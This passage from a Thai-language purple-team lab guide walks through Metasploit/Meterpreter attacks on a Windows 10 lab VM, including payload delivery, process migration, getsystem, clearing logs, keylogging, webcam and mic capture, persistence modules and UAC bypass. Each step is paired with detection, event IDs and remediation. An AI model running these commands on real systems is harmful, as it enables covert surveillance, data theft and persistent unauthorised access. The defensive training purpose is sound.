jobs            # ดู handler ที่รันอยู่
jobs -K         # ปิด job ทั้งหมด
sessions        # ดู session ที่ได้มา
sessions -i 1   # เข้า interact กับ session id 1
```

## 5.5 Expected System Behavior
- Kali เปิดพอร์ต `4444` (หรือ `8443`) รอรับ — ตรวจได้ด้วย `ss -tlnp | grep 4444` บน Kali
- ยังไม่มี session จนกว่าเครื่องเป้าหมายจะรัน payload (บทที่ 6)

## 5.6 Blue Team Detection (สำหรับ traffic ของ C2)
แม้ handler อยู่ฝั่ง Kali แต่เมื่อเกิด session จริง Blue Team บน/รอบ Windows จะเห็น:
- **การเชื่อมต่อออก (Outbound)** จากเครื่อง Windows ไปยัง `192.168.56.10:4444` — พอร์ตแปลก, ปลายทางเป็น host ใน subnet เดียวกันที่ไม่ใช่ server ปกติ
- **Sysmon Event ID 3 (Network connection)** ระบุ process ที่เปิด connection (เช่น `win10_test.exe` หรือ process ที่ถูก inject)
- reverse_tcp: มี pattern การ beacon/keep-alive; reverse_https: TLS ที่ **certificate มักเป็น self-signed** และ SNI/JA3 ที่ผิดปกติ

## 5.7 Relevant Windows Logs
- **Sysmon 3** (Network connection) — สำคัญที่สุดสำหรับ C2 detection
- **Windows Filtering Platform** (Security 5156 — Allowed connection) ถ้าเปิด audit
- Firewall log (ถ้าเปิด) ที่ `%systemroot%\System32\LogFiles\Firewall\pfirewall.log`

## 5.8 Detection Improvement
- สร้าง alert สำหรับ **outbound ไปพอร์ตไม่มาตรฐาน (เช่น 4444)** จาก process ในโฟลเดอร์ผู้ใช้
- ตรวจ TLS ที่ใช้ self-signed cert ต่อ host ภายในที่ไม่ใช่ server

## 5.9 MITRE ATT&CK Mapping (บทที่ 5)
- **TA0011** Command and Control
- **T1571** Non-Standard Port (เช่น 4444)
- **T1573.002** Encrypted Channel: Asymmetric Cryptography (reverse_https/TLS)

## 5.10 Lessons Learned (บทที่ 5)
- Handler ที่ "เงียบ" ฝั่ง C2 ไม่ได้แปลว่าเงียบฝั่งเป้าหมาย — การเชื่อมต่อออกคือจุดตรวจจับสำคัญ
- พอร์ต default `4444` เป็น IoC คลาสสิกของ Metasploit

---

# บทที่ 6 — การส่งมอบและการรันไฟล์ `.exe` บนเครื่อง Lab (User Execution)

> บทนี้ใช้โครงสร้างครบ 15 หัวข้อ (Scenario → Lessons Learned) ตามที่กำหนด

## 6.1 Scenario
ผู้ทดสอบวางไฟล์ `win10_test.exe` ไว้ให้ผู้ใช้บนเครื่อง **WIN10-LAB (192.168.56.20)** ดาวน์โหลดและ **ดับเบิลคลิกรันเอง** จำลองสถานการณ์ไฟล์แนบอีเมล/ไฟล์ปลอมที่ผู้ใช้เปิด

## 6.2 Red Team Objective
ได้ Meterpreter session แรกบนเครื่องเป้าหมายผ่านช่องทาง **User Execution** (ไม่พึ่ง exploit ช่องโหว่)

## 6.3 Attack Surface
- พฤติกรรมผู้ใช้ (เปิดไฟล์ที่ไม่รู้จัก)
- การตั้งค่าความปลอดภัย: SmartScreen, Defender, การแสดงนามสกุลไฟล์

## 6.4 Attack Path
```
โอนไฟล์เข้า WIN10-LAB (เช่นผ่าน share ใน Lab)  →  ผู้ใช้ดับเบิลคลิก win10_test.exe  →
process ใหม่รัน → payload โทรกลับ 192.168.56.10:4444 → Kali ได้ session
```

**วิธีโอนไฟล์เข้า Lab (ตัวอย่างที่ทำได้จริงบน Kali):**
```bash
# ตั้ง HTTP server ชั่วคราวบน Kali เพื่อให้เครื่อง Windows ใน Lab ดึงไฟล์
cd /home/kali/lab && python3 -m http.server 8000
```
บน Windows 10 Lab (จำลองผู้ใช้ดาวน์โหลด — ทำบนเครื่องเป้าหมายของคุณเอง):
```powershell
# ดาวน์โหลดไฟล์ทดสอบจาก Kali ภายใน Lab
Invoke-WebRequest -Uri "http://192.168.56.10:8000/win10_test.exe" -OutFile "$env:USERPROFILE\Downloads\win10_test.exe"
```
จากนั้น **ดับเบิลคลิกไฟล์** (หรือรันใน cmd) เพื่อจำลอง User Execution

## 6.5 Technique / Tactic
- **T1204.002** User Execution: Malicious File (Tactic: Execution / TA0002)
- ประกอบกับ **TA0001** Initial Access (ผ่านการส่งมอบไฟล์)

## 6.6 Expected System Behavior
- process `win10_test.exe` ถูกสร้าง (parent มักเป็น `explorer.exe` เมื่อดับเบิลคลิก)
- process เปิด outbound TCP ไป `192.168.56.10:4444`
- บน Kali ปรากฏ `Meterpreter session 1 opened`

**ยืนยันฝั่ง Kali:**
```
sessions            # ควรเห็น session 1 ชนิด meterpreter x64/windows
sessions -i 1
```

## 6.7 Blue Team Detection
- **Process creation** ผิดปกติ: `explorer.exe` → `win10_test.exe` (ไฟล์ใน `Downloads`) → เปิด network
- **Parent/Child ผิดธรรมชาติ** หากมีการ migrate/spawn ต่อ (เช่น payload spawn `cmd.exe`/`powershell.exe`)
- **Network:** outbound ไปพอร์ต 4444 จาก process ที่อยู่ในโฟลเดอร์ผู้ใช้

**Normal vs Suspicious:**
| Normal | Suspicious |
|--------|-----------|
| `explorer.exe` เปิดโปรแกรมที่ติดตั้งใน `Program Files` | `explorer.exe` เปิด `.exe` สุ่มชื่อใน `Downloads/Temp` |
| โปรแกรมทั่วไปต่อ 80/443 ไป CDN/known host | ต่อพอร์ต 4444 ไป host ภายในที่ไม่ใช่ server |

## 6.8 Relevant Windows Logs
- **Security 4688** (Process Creation) + command line — เห็นชื่อไฟล์และ path
- **Sysmon 1** (Process Create) — มี hash, parent process, command line
- **Sysmon 3** (Network Connection) — เห็นปลายทาง 192.168.56.10:4444
- **Sysmon 11** (FileCreate) — ตอนไฟล์ถูกเขียนลง Downloads
- **Defender 1116/1117** (ถ้าเปิด Real-time และมี signature)

**ตัวอย่าง query บน Windows (PowerShell):**
```powershell
# ค้นหา Event 4688 ที่เกี่ยวกับไฟล์ทดสอบ
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 200 |
  Where-Object { $_.Message -match 'win10_test.exe' } |
  Format-List TimeCreated, Message
```
```powershell
# ค้นหา Sysmon Process Create (Event ID 1)
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 200 |
  Where-Object { $_.Id -eq 1 -and $_.Message -match 'win10_test.exe' } |
  Format-List TimeCreated, Message
```

## 6.9 IOC / Behavioral Indicators
- **Static:** SHA-256 ของ `win10_test.exe` (บันทึกไว้ในบทที่ 4)
- **Path:** `%USERPROFILE%\Downloads\win10_test.exe` มี ADS `Zone.Identifier`
- **Network:** เชื่อมต่อ `192.168.56.10:4444`
- **Behavioral:** ไฟล์เพิ่งดาวน์โหลด → ถูกรันภายในไม่กี่วินาที → เปิด outbound พอร์ตแปลก

## 6.10 Investigation Procedure
1. ยืนยัน process: หา PID/parent จาก 4688/Sysmon 1
2. ตรวจ hash ไฟล์เทียบกับ IoC ที่ทราบ
3. ดู network connection ที่ผูกกับ PID นั้น (`Get-NetTCPConnection -OwningProcess <PID>`)
4. ตรวจว่ามี child process / injection ต่อหรือไม่ (บทที่ 7)

```powershell
# ดู connection ที่ผูกกับ process ต้องสงสัย
Get-NetTCPConnection -State Established |
  Where-Object { $_.RemoteAddress -eq '192.168.56.10' } |
  Select-Object LocalPort, RemoteAddress, RemotePort, OwningProcess
```

## 6.11 Containment
- **แยกเครื่อง (Network Isolation):** ถอด/ปิด network adapter ของ VM หรือใช้ Firewall block ปลายทาง C2
- Kill process ต้องสงสัย
```powershell
# (ในการตอบสนองเหตุการณ์) ปิด process ตาม PID
Stop-Process -Id <PID> -Force
# บล็อก outbound ไป C2 ที่ระดับ host firewall
New-NetFirewallRule -DisplayName "Block-C2-Test" -Direction Outbound -RemoteAddress 192.168.56.10 -Action Block
```

## 6.12 Remediation
- ลบไฟล์ payload และ artifact ที่เกี่ยวข้อง
- ตรวจ Persistence (บทที่ 9) ก่อนประกาศว่าสะอาด
- Revert Snapshot กลับ baseline หากเป็นเพียงการทดสอบ

## 6.13 Detection Improvement
- Alert: `explorer.exe` เป็น parent ของ `.exe` ใน `Downloads/Temp` ที่เปิด network ภายใน N วินาที
- เปิด **ASR rule** ที่บล็อก executable ที่ดาวน์โหลดมาและไม่ผ่านเกณฑ์ความน่าเชื่อถือ

## 6.14 MITRE ATT&CK Mapping (บทที่ 6)
- **T1204.002** User Execution: Malicious File
- **T1105** Ingress Tool Transfer (การโอนไฟล์เข้าเครื่อง)
- **T1036** Masquerading (ถ้าไฟล์ตั้งชื่อ/ไอคอนหลอก)

## 6.15 Risk Rating + Lessons Learned (บทที่ 6)
**Risk (พร้อมเหตุผล):**
- Impact: **สูง** — ได้ session = ควบคุมเครื่องระดับผู้ใช้
- Likelihood: **ปานกลาง** — ต้องอาศัยผู้ใช้เปิดไฟล์เอง
- Detectability: **สูง** — payload มาตรฐานเสียงดัง (Defender + 4688 + Sysmon เห็นชัด)
- Privilege Required: **ต่ำ** — แค่สิทธิ์ผู้ใช้ทั่วไปก็รันได้
- Attack Complexity: **ต่ำ** — ใช้เครื่องมือสำเร็จรูป

**Lessons Learned:** จุดตัดสำคัญคือ "ผู้ใช้เปิดไฟล์" — การอบรมผู้ใช้ + SmartScreen/ASR + การแสดงนามสกุลไฟล์ ลด Likelihood ได้มากที่สุด

---

# บทที่ 7 — หลังเครื่องติด: คำสั่ง Post-Exploitation หลัก (Meterpreter)

## 7.1 Objective
รวบรวม **ลิสต์คำสั่ง Meterpreter ที่ใช้ได้จริง** ที่ Red Team มักใช้ทันทีหลังได้ session พร้อมสิ่งที่ Blue Team เห็นในแต่ละคำสั่ง

## 7.2 Prerequisites
- มี Meterpreter session (จากบทที่ 6): `sessions -i 1`

## 7.3 ลิสต์คำสั่งสำรวจเบื้องต้น (Orientation) — ใช้ได้จริงทั้งหมด

| คำสั่ง (ใน meterpreter) | ทำอะไร | Blue Team เห็นอะไร |
|------------------------|--------|---------------------|
| `sysinfo` | ข้อมูลระบบ (OS, arch, hostname, domain) | ส่วนใหญ่ทำผ่าน API ในหน่วยความจำ — เห็นยาก ต้องดูที่ session network |
| `getuid` | ผู้ใช้ปัจจุบันของ process | — (in-memory) |
| `getpid` | PID ของ process ที่ meterpreter อยู่ | — |
| `getprivs` | สิทธิ์ (privileges) ของ token ปัจจุบัน | — |
| `ps` | แสดง process ทั้งหมด | — |
| `pwd` / `ls` / `cd` | เดินไฟล์ระบบ | Sysmon อาจเห็นการเข้าถึงไฟล์บางกรณี |
| `idletime` | เวลาที่ผู้ใช้ไม่ได้ใช้งาน | — |
| `route` | ตารางเส้นทางเครือข่ายของเป้าหมาย | — |
| `ipconfig` / `arp` | ข้อมูลเครือข่าย | — |

**ตัวอย่างลำดับการใช้จริงหลังได้ session:**
```
sysinfo
getuid
getpid
getprivs
ps
```

## 7.4 การซ่อนตัว/ย้าย process ด้วย `migrate` (สำคัญ)
```
# ดู process เพื่อหาเป้าหมายที่จะ migrate เข้าไป
ps
# ย้าย meterpreter เข้าไปใน process ที่ดูปกติ เช่น explorer.exe (ใช้ PID จริงจาก ps)
migrate 2148
# หรือให้ meterpreter เลือก explorer.exe ให้อัตโนมัติ
migrate -N explorer.exe
```
**ทำไม:** ถ้า process `win10_test.exe` ถูกปิด session จะหลุด การ migrate ย้าย meterpreter ไปฝังใน process ที่ดำรงอยู่ (เช่น `explorer.exe`) เพื่อความคงทน + ดูปกติขึ้น

**Blue Team เห็นอะไร (สำคัญ):**
- การ migrate ใช้เทคนิค **Process Injection** → **Sysmon Event ID 8 (CreateRemoteThread)** และ/หรือ **Event ID 10 (ProcessAccess)** ด้วยสิทธิ์การเข้าถึงที่ผิดปกติ (เช่น `PROCESS_VM_WRITE`, `PROCESS_CREATE_THREAD`)
- นี่คือหนึ่งใน **จุดตรวจจับที่ดีที่สุด** ของ Meterpreter

## 7.5 การยกสิทธิ์เร็ว ๆ ด้วย `getsystem` (เกริ่น — รายละเอียดในบทที่ 10)
```
getsystem
getuid        # ตรวจว่าได้ NT AUTHORITY\SYSTEM หรือยัง
```
`getsystem` ใช้เทคนิค named-pipe / token impersonation — **Blue Team ตรวจได้จาก** การสร้าง named pipe และ Event 4674/4688 ที่เกี่ยวข้อง (ดูบทที่ 10)

## 7.6 การเข้า shell ระบบ
```
shell            # เปิด cmd.exe บนเป้าหมาย
# ตัวอย่างคำสั่งใน shell
whoami
hostname
exit             # กลับสู่ meterpreter
```
**Blue Team เห็นอะไร:** meterpreter `shell` จะ spawn `cmd.exe` เป็น child ของ process ที่ meterpreter อยู่ → **Security 4688 / Sysmon 1** แสดง parent/child ที่ผิดปกติ (เช่น `explorer.exe` → `cmd.exe` โดยไม่มีหน้าต่าง)

## 7.7 การ background และสลับ session
```
background       # พัก session กลับไป msfconsole (session ยังอยู่)
sessions         # ดู session ทั้งหมด
sessions -i 1    # กลับเข้า session 1
```

## 7.8 คำสั่งไฟล์ (Collection เบื้องต้น)
```
ls
download C:\\Users\\victim\\Documents\\secret.txt /home/kali/lab/loot/
upload /home/kali/lab/tool.exe C:\\Users\\Public\\
cat C:\\Users\\victim\\Desktop\\note.txt
search -f *.kdbx        # ค้นหาไฟล์ตามรูปแบบ
```
(รายละเอียด Collection/Exfiltration อยู่ในบทที่ 14)

## 7.9 การล้างร่องรอย log (`clearev`) — และทำไม Blue Team ชอบมัน
```
clearev          # ล้าง Windows Event Logs (Application, System, Security)
```
**สำคัญ (Blue Team):** การล้าง log **ไม่ได้เงียบ** — มันสร้างหลักฐานเด่นชัด:
- **Security Event ID 1102** (The audit log was cleared)
- **System Event ID 104** (Log file was cleared)
> การหายไปของ log อย่างกะทันหัน + 1102/104 = สัญญาณ **Defense Evasion** ที่ตรวจจับง่ายและควรตั้ง alert ระดับสูง

## 7.10 Blue Team Detection รวม (บทที่ 7)
- **Process Injection (migrate):** Sysmon 8/10 — จุดแข็งของการตรวจจับ Meterpreter
- **Child process ผิดปกติ:** `explorer.exe`/office → `cmd.exe`/`powershell.exe` (4688 / Sysmon 1)
- **Log clearing:** Security 1102, System 104
- **การคง network session:** outbound คงค้างไปยัง C2 (Sysmon 3)

## 7.11 Relevant Windows Logs (บทที่ 7)
| กิจกรรม | Log / Event ID |
|--------|----------------|
| Process create/child | Security **4688**, Sysmon **1** |
| Process injection (migrate) | Sysmon **8** (CreateRemoteThread), **10** (ProcessAccess) |
| Network C2 | Sysmon **3** |
| Log cleared | Security **1102**, System **104** |
| Special privileges assigned | Security **4672** |

## 7.12 Investigation Procedure (บทที่ 7)
1. เริ่มจาก process ที่มี outbound ไป C2 → หา PID
2. ตรวจว่ามี Sysmon 8/10 ที่ target เป็น `explorer.exe` (สัญญาณ migrate) หรือไม่
3. ไล่ child process ที่ spawn ออกมา (cmd/powershell)
4. ตรวจ 1102/104 เพื่อดูว่ามีการล้าง log (อาจต้องพึ่ง log ที่ forward ออกไป SIEM แล้ว)

## 7.13 Containment / Remediation (บทที่ 7)
- Isolate + kill process chain ทั้งสาย (รวม process ที่ถูก inject)
- เพราะ meterpreter อาจ migrate แล้ว → **อย่าปิดแค่ `win10_test.exe`** ให้ไล่จนครบ (บทที่ 18)

## 7.14 MITRE ATT&CK Mapping (บทที่ 7)
- **T1055** Process Injection (migrate)
- **T1059.003** Windows Command Shell (`shell` → cmd.exe)
- **T1070.001** Indicator Removal: Clear Windows Event Logs (`clearev`)
- **T1057** Process Discovery (`ps`), **T1082** System Information Discovery (`sysinfo`)

## 7.15 Lessons Learned (บทที่ 7)
- `migrate` คือดาบสองคม: ช่วย Red Team คงทน แต่สร้าง telemetry (Sysmon 8/10) ที่ตรวจจับได้ดีมาก
- `clearev` เป็น "ธงแดง" — Blue Team ควรตั้ง alert ให้ 1102/104 เป็นระดับ Critical และ forward log ออกนอกเครื่องแบบ real-time

# บทที่ 8 — พฤติกรรมแบบ Spyware (Keylog / Screenshot / Webcam / Mic)

> บทนี้คือหัวใจของ "Spyware ที่สร้างจาก Metasploit" — แต่ต้องเข้าใจว่านี่คือ **ฟีเจอร์ post-exploitation ของ Meterpreter ที่มีอยู่จริง** (surveillance modules) ไม่ใช่ payload แยกชนิด "spyware" ทั้งหมดอยู่ในขอบเขต Collection (TA0009)

## 8.1 Scenario
หลังได้ session บน WIN10-LAB ผู้ทดสอบใช้ความสามารถสอดแนมในตัวของ Meterpreter เพื่อจำลองพฤติกรรม Spyware: ดักแป้นพิมพ์ จับภาพหน้าจอ ฯลฯ — เพื่อให้ Blue Team ฝึกตรวจจับพฤติกรรมเก็บข้อมูล

## 8.2 Red Team Objective
เก็บข้อมูลผู้ใช้ (keystrokes, ภาพหน้าจอ) จากเครื่องเป้าหมายในเชิงจำลอง

## 8.3 Attack Surface / Prerequisites
- มี Meterpreter session (อยู่ใน process ที่มี desktop session ของผู้ใช้)
- บางฟีเจอร์ (mic/webcam) ต้องมีฮาร์ดแวร์/สิทธิ์เข้าถึงอุปกรณ์

## 8.4 ลิสต์คำสั่ง Surveillance ที่ใช้ได้จริง (Meterpreter)

**1) Keylogging (T1056.001)**
```
keyscan_start        # เริ่มดักแป้นพิมพ์ของ process/desktop ปัจจุบัน
keyscan_dump         # ดึงคีย์ที่ดักได้ออกมา
keyscan_stop         # หยุดดักแป้นพิมพ์
```
> เพื่อดักการพิมพ์ของผู้ใช้ อาจต้อง `migrate` เข้า `explorer.exe` หรือ process ที่ผูกกับ desktop ของผู้ใช้ก่อน (บทที่ 7.4)

**2) Screen Capture (T1113)**
```
screenshot           # ถ่ายภาพหน้าจอปัจจุบัน (บันทึกเป็นไฟล์บน Kali)
screenshare          # สตรีมหน้าจอแบบ real-time (เปิดผ่าน browser บน Kali)
```

**3) Video / Webcam Capture (T1125)**
```
webcam_list          # แสดงกล้องที่มี
webcam_snap          # ถ่ายภาพจากกล้อง
webcam_stream        # สตรีมวิดีโอจากกล้อง
```

**4) Audio Capture (T1123)**
```
record_mic -d 10     # อัดเสียงจากไมค์ 10 วินาที
```

**หมายเหตุ:** โมดูลเสริมบางตัวอาจต้องโหลด extension เพิ่ม เช่น `load espia` (มีคำสั่ง `screengrab`) — ตรวจสอบว่ามีในเวอร์ชันของคุณด้วย `help` หลัง `load`

## 8.5 Technique / Tactic
- **T1056.001** Input Capture: Keylogging
- **T1113** Screen Capture
- **T1125** Video Capture
- **T1123** Audio Capture
- Tactic รวม: **Collection (TA0009)**

## 8.6 Expected System Behavior
- ไม่มีหน้าต่าง UI ปรากฏ (ทำงานเงียบในหน่วยความจำผ่าน API ของ meterpreter)
- keylogging เรียก API ระดับ hook/GetAsyncKeyState; screenshot เรียก GDI/DirectX APIs
- ไฟล์ผลลัพธ์ (ภาพ/เสียง) ถูกส่งกลับผ่าน C2 channel → ปรากฏบน Kali ไม่ใช่บนเป้าหมาย

## 8.7 Blue Team Detection
พฤติกรรมสอดแนมของ Meterpreter **ตรวจจับยากด้วย signature ตรง ๆ** เพราะทำงาน in-memory — จึงต้องพึ่ง **Behavioral + Context**:
- process ที่ถูก inject (เช่น `explorer.exe` ที่มี thread แปลก จาก Sysmon 8) เริ่มมีการเข้าถึง API สอดแนม
- **การคงอยู่ของ C2 session** ที่มี traffic เพิ่มขึ้นเป็นช่วง (ส่งภาพ/เสียง = ข้อมูลก้อนใหญ่กว่า beacon ปกติ) — Sysmon 3 + ปริมาณ data
- ถ้ามี **EDR**: การเรียก API สอดแนมจาก process ที่ไม่ควรทำ (เช่น `explorer.exe` เรียก webcam) เป็น anomaly

**Normal vs Suspicious:**
| Normal | Suspicious |
|--------|-----------|
| แอปประชุม (Teams/Zoom) เข้าถึงกล้อง/ไมค์ | `explorer.exe`/process ระบบเข้าถึงกล้อง/ไมค์ |
| แอปจับภาพหน้าจอที่ผู้ใช้เปิด | process background ที่ไม่มี UI จับภาพหน้าจอต่อเนื่อง |

## 8.8 Relevant Windows Logs
- **Sysmon 8/10** (injection เข้า process ที่ทำ surveillance)
- **Sysmon 3** (การส่งข้อมูลออก — ปริมาณสูงกว่าปกติ)
- **Microphone/Camera access:** Windows Privacy settings บันทึกการเข้าถึงกล้อง/ไมค์ใน registry (`HKCU\...\CapabilityAccessManager\ConsentStore\microphone|webcam`) — ตรวจ timestamp `LastUsedTimeStop/Start` ได้
- **PowerShell 4104** ถ้า Red Team ใช้สคริปต์ประกอบ

## 8.9 IOC / Behavioral Indicators
- process ที่ไม่ใช่แอปสื่อสารแต่เข้าถึงกล้อง/ไมค์
- traffic ออกเป็นก้อนใหญ่ผิดปกติไป C2
- (ถ้า migrate) thread แปลกใน `explorer.exe`

## 8.10 Investigation Procedure
1. ระบุ process ที่ถือ C2 session (จาก Sysmon 3 → PID)
2. ตรวจว่ามี injection (Sysmon 8/10) เข้า process นั้นหรือไม่
3. ตรวจ CapabilityAccessManager ใน registry ว่ามี process แปลกเข้าถึงกล้อง/ไมค์ในช่วงเวลาที่สงสัย
```powershell
# ตรวจประวัติการใช้กล้อง/ไมค์ต่อแอป (CapabilityAccessManager)
$base='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore'
Get-ChildItem "$base\microphone\NonPackaged" -ErrorAction SilentlyContinue |
  ForEach-Object { $_.PSChildName }
```

## 8.11 Containment / Remediation
- Isolate + kill process chain (รวม process ที่ถูก inject)
- เพิกถอนสิทธิ์กล้อง/ไมค์ระดับระบบชั่วคราวระหว่างสอบสวน

## 8.12 Detection Improvement
- สร้าง detection: process ที่ไม่อยู่ allowlist แต่เข้าถึงกล้อง/ไมค์
- เฝ้าปริมาณ outbound ต่อ session ที่คงค้าง — spike = อาจกำลัง exfiltrate สื่อ

## 8.13 MITRE ATT&CK Mapping (บทที่ 8)
- **T1056.001** Keylogging · **T1113** Screen Capture · **T1125** Video Capture · **T1123** Audio Capture
- **T1074** Data Staged (ก่อนส่งออก)

## 8.14 Risk Rating (พร้อมเหตุผล)
- Impact: **สูง** — ละเมิดความลับ (รหัสผ่านที่พิมพ์, ข้อมูลบนจอ)
- Likelihood: **สูง** เมื่อมี session แล้ว — เป็นฟีเจอร์ในตัว
- Detectability: **ปานกลาง–ต่ำ** — in-memory ตรวจ signature ยาก ต้องพึ่ง behavior/EDR
- Privilege Required: **ต่ำ** — สิทธิ์ผู้ใช้ก็ keylog/screenshot ได้
- Attack Complexity: **ต่ำ**

## 8.15 Lessons Learned (บทที่ 8)
- "Spyware จาก Metasploit" จริง ๆ คือ **ความสามารถ collection ในตัวของ Meterpreter** — ไม่มี payload แยกชื่อ spyware
- เพราะทำงาน in-memory การป้องกันที่ดีที่สุดคือ **ตัด initial access + ตรวจ injection (Sysmon 8/10) + EDR behavioral**

---

# บทที่ 9 — การคงอยู่ในระบบ (Persistence)

## 9.1 Scenario
ผู้ทดสอบต้องการให้ session กลับมาได้แม้เครื่องรีบูต จึงตั้ง Persistence บน WIN10-LAB

## 9.2 Red Team Objective
สร้างกลไกให้ payload ถูกเรียกใช้ซ้ำ (Tactic: Persistence / TA0003)

## 9.3 ลิสต์โมดูล/คำสั่ง Persistence ที่ใช้ได้จริง

**1) Registry Run Key (T1547.001)**
```
# จาก session ที่ background แล้ว ใน msfconsole
use exploit/windows/local/registry_persistence
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
run
```

**2) Scheduled Task (T1053.005)**
```
use exploit/windows/local/schtasks_persistence
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
run
```

**3) Windows Service (T1543.003)**
```
use exploit/windows/local/persistence_service
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
run
```

**4) โมดูล persistence รวม (ตรวจสอบชื่อในเวอร์ชันของคุณ)**
```
use exploit/windows/local/persistence
info                 # อ่าน options ที่รองรับ (เช่น STARTUP, method)
```
> **หมายเหตุ:** คำสั่ง meterpreter `run persistence` แบบเก่าถูกเลิกใช้/ย้ายเป็นโมดูล `exploit/windows/local/*` — ให้ยึดโมดูลข้างต้น และตรวจ `search persistence` ในเวอร์ชันจริงเสมอ (ห้ามแต่งชื่อโมดูล)

## 9.4 Expected System Behavior (แยกตามวิธี)
| วิธี | Artifact บน Windows |
|-----|---------------------|
| Registry Run | ค่าใหม่ใน `HKCU\...\Run` หรือ `HKLM\...\Run` ชี้ไป payload |
| Scheduled Task | task ใหม่ใน Task Scheduler + ไฟล์ XML ใน `C:\Windows\System32\Tasks\` |
| Service | service ใหม่ (auto-start) ชี้ไป payload |

## 9.5 Blue Team Detection + Relevant Windows Logs
| วิธี | Event ID / แหล่ง |
|-----|------------------|
| Scheduled Task สร้าง | **Security 4698** (Task created); 4702 (updated); Microsoft-Windows-TaskScheduler/Operational 106/140 |
| Service ติดตั้ง | **System 7045** (New service installed); Security **4697** (ถ้าเปิด audit) |
| Registry Run key | **Sysmon 13** (RegistryValueSet) ที่ target key `...\Run`; Security 4657 (ถ้าตั้ง SACL) |
| ไฟล์ payload ถูกเขียน | **Sysmon 11** (FileCreate) |

**ตัวอย่าง hunting บน Windows:**
```powershell
# ตรวจ service ที่เพิ่งติดตั้ง (System 7045)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 50 |
  Format-List TimeCreated, Message

# ตรวจ Scheduled Task ที่เพิ่งสร้าง (Security 4698)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4698} -MaxEvents 50 |
  Format-List TimeCreated, Message

# ตรวจ Run keys ทั้ง HKCU และ HKLM
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue

# แจกแจง Scheduled Tasks ที่ไม่ใช่ของ Microsoft
Get-ScheduledTask | Where-Object { $_.TaskPath -notmatch '\\Microsoft\\' } |
  Select-Object TaskName, TaskPath, State
```

## 9.6 IOC / Behavioral Indicators
- service/task ที่ path ชี้ไปไฟล์ใน `Users\Public`, `%TEMP%`, `%APPDATA%`
- Run key ที่ค่าเป็น path ผิดปกติ/สุ่มชื่อ
- ชื่อ service/task ปลอมเลียนของ Windows (เช่น "Windwos Update")

## 9.7 Investigation Procedure
1. เทียบเวลา 4698/7045/Sysmon 13 กับช่วงเวลาที่พบ initial access (บทที่ 6)
2. ยืนยัน path/binary ที่ถูกอ้างถึง → ตรวจ hash เทียบ IoC
3. หา autoruns อื่นที่อาจซ่อน (ใช้ Autoruns ของ Sysinternals ใน Lab)

## 9.8 Containment / Remediation
```powershell
# ปิดและลบ service ที่เป็นอันตราย (ตัวอย่าง)
Stop-Service -Name "<svc>" -Force
sc.exe delete "<svc>"

# ลบ scheduled task
Unregister-ScheduledTask -TaskName "<task>" -Confirm:$false

# ลบ Run key ที่เป็นอันตราย
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "<value>"
```
> ต้องลบ **ทุกกลไก** persistence ให้ครบก่อนประกาศเครื่องสะอาด (มักมีหลายชั้น)

## 9.9 Detection Improvement
- Alert เมื่อ 4698/7045 เกิดจาก parent ที่ไม่ใช่ตัวติดตั้งซอฟต์แวร์ที่รู้จัก
- Baseline autoruns ของเครื่อง แล้ว alert เมื่อมีรายการใหม่

## 9.10 MITRE ATT&CK Mapping (บทที่ 9)
- **T1547.001** Registry Run Keys / Startup Folder
- **T1053.005** Scheduled Task
- **T1543.003** Windows Service

## 9.11 Risk Rating + Lessons Learned
- Impact: **สูง** (ผู้โจมตีกลับเข้ามาได้ซ้ำ) · Likelihood: **สูง** เมื่อมี session
- Detectability: **สูง** — 4698/7045/Sysmon 13 เป็น telemetry ที่เด่นชัด (นี่คือจุดแข็งของ Blue Team)
- Privilege Required: Registry(HKCU)/Task = ผู้ใช้; Service/HKLM = ต้อง admin
- **Lessons Learned:** Persistence เป็นเทคนิคที่ "ดัง" — Blue Team ที่เก็บ 4698/7045/Sysmon 13 และทำ autoruns baseline จะจับได้เกือบทุกครั้ง

---

# บทที่ 10 — การยกระดับสิทธิ์ (Privilege Escalation)

## 10.1 Scenario
session ที่ได้เป็นสิทธิ์ผู้ใช้ทั่วไป ผู้ทดสอบพยายามยกระดับเป็น Administrator/SYSTEM บน WIN10-LAB

## 10.2 Red Team Objective
ได้สิทธิ์สูงขึ้น (Tactic: Privilege Escalation / TA0004) เพื่อเข้าถึง credential/persistence ระดับเครื่อง

## 10.3 ลิสต์เทคนิค/โมดูลที่ใช้ได้จริง

**1) `getsystem` (Token/Named-pipe impersonation, T1134)**
```
getsystem
getuid          # ควรได้ NT AUTHORITY\SYSTEM
```

**2) Local Exploit Suggester (แนะนำช่องโหว่ที่เป็นไปได้)**
```
# background session ก่อน แล้ว:
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```
> โมดูลนี้ **แนะนำ** local exploit ที่อาจใช้ได้ตามเวอร์ชัน/แพตช์ของเป้าหมาย — ใช้เฉพาะที่โมดูลมีจริงและในเครื่อง Lab เท่านั้น ห้ามแต่งชื่อ exploit

**3) Bypass UAC (T1548.002)** — เมื่อผู้ใช้อยู่ในกลุ่ม Administrators แต่ token ยังไม่ยกสิทธิ์
```
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4445
run
```
มีหลายรูปแบบ เช่น `bypassuac`, `bypassuac_injection`, `bypassuac_fodhelper`, `bypassuac_eventvwr` — **ตรวจ `search bypassuac`** ในเวอร์ชันจริง และเลือกที่ตรงกับ build ของ Windows

## 10.4 Expected System Behavior
- `getsystem`: สร้าง **named pipe** + impersonate token ของ SYSTEM
- bypassuac_*: มักใช้ **auto-elevate binary + registry hijack** (เช่น fodhelper/eventvwr เรียก payload ด้วยสิทธิ์สูง)

